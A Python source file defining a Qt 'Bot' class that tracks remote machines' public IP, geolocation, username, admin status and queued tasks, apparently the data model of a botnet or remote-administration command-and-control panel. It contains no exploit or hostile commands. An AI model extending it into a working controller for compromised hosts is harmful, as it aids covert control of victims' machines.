from qtpy.QtCore import Signal, Slot

from models.Device import Device
from models.Events import Info, Task

import datetime


class Bot(Device):
    update_map = Signal(int, list)
    updated = Signal()

    def __init__(self, server, bot_id: int, ip: str, port: int, **kwargs):
        super(Bot, self).__init__(server, bot_id, ip, port)

        self.hash = None
        self.relay_status = None

        self.public_ip = None
        self.geolocation = None
        self.platform = None
        self.architecture = None
        self.username = None
        self.administrator = None
        self.language = None
        self.time_created = datetime.datetime.now()

        self.logs = []
        self.tasks = []
        self.modules = []
        self.next_task_id = 0
        self.update(kwargs)

    @Slot()
    def get_next_task_id(self):
        self.next_task_id = self.next_task_id + 1
        return self.next_task_id

    @Slot()
    def get_task_by_id(self, task_id):
        for task in self.tasks:
            if task.get_id() == task_id:
                return task

    @Slot(Info)
    def on_info_received(self, info: Info):
        data = {}
        for result in info.results:
            util = info.results.get(result)
            if result == "tasks":
                for task in util:
                    ev = Task(info.get_bot_id(), task.get("task_id"), task.get("task"), task.get("state"))
                    self.on_task_received(ev)
            else:
                if util.get("exit_code") == 0:
                    data[result] = util.get("result")
                    if result == "geolocation":
                        self.update_map.emit(self.id(), data[result])
                else:
                    data[result] = None
        self.update(data)

    @Slot(Task)
    def on_task_received(self, task: Task):
        """Triggered when bot receives new task and on finish."""
        for bot_task in self.tasks:
            if bot_task.get_id() == task.get_id():
                bot_task.update(task)
                self.updated.emit()
                return
        self.tasks.append(task)
        self.next_task_id = max(t.id for t in self.tasks)
        self.updated.emit()

    @Slot(dict)
    def update(self, response: dict):
        """Update bot attributes."""
        for key, value in response.items():
            if key and hasattr(self, key):
                setattr(self, key, value)
        self.updated.emit()
